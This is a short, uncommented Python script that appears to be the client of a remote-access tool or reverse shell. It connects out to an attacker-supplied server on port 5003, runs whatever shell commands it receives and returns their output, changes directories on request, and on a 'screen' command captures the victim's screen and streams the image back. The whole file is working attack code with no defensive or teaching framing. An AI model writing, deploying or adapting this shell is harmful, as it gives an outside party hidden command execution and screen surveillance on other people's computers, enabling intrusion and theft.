import socket
import os
import subprocess
import sys
import cv2
import numpy as np
import pyautogui

SERVER_HOST = sys.argv[1]
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 
SEPARATOR = "<sep>"


s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

cwd = os.getcwd()
s.send(cwd.encode())


while True:
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()

    if splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""

    if splited_command[0].lower() == "screen":
        SCREEN_SIZE = tuple(pyautogui.size())
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        s.send("sc".encode())

        frame_bytes = frame.tobytes()

        frame_size = len(frame_bytes)
        s.sendall(frame_size.to_bytes(8, byteorder='big'))

        total_sent = 0
        while total_sent < frame_size:
            chunk = frame_bytes[total_sent:total_sent+BUFFER_SIZE]
            sent = s.send(chunk)
            total_sent += sent

        continue

    else:
        output = subprocess.getoutput(command)
    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())
s.close()